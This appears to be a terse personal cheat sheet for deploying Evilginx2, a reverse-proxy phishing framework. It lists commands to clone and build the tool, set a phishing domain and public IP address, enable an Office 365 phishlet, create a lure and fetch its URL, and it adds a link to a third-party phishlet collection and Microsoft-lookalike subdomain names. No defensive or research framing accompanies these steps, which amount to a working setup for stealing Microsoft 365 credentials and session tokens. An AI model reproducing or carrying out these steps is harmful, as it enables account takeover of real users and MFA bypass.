
cd /usr/share/evilginx2
/usr/share/evilginx2# ./build/evilginx -p ./phishlets/

config domain url.com
config ipv4 external 62.171.129.71
phishlets hostname o365 url.com
phishlets enable o365
lures create o365 [only the first time, is the id process that will trigger the link]
lures get-url 0

GitHub:
https://github.com/kgretzky/evilginx2.git
~$ git clone https://github.com/kgretzky/evilginx2.git
~$ apt-get install go nodejs
~$ make

Phishlets:
https://github.com/simplerhacking/Evilginx3-Phishlets

login
cdn
account
microsoft
www
login.microsoftonline
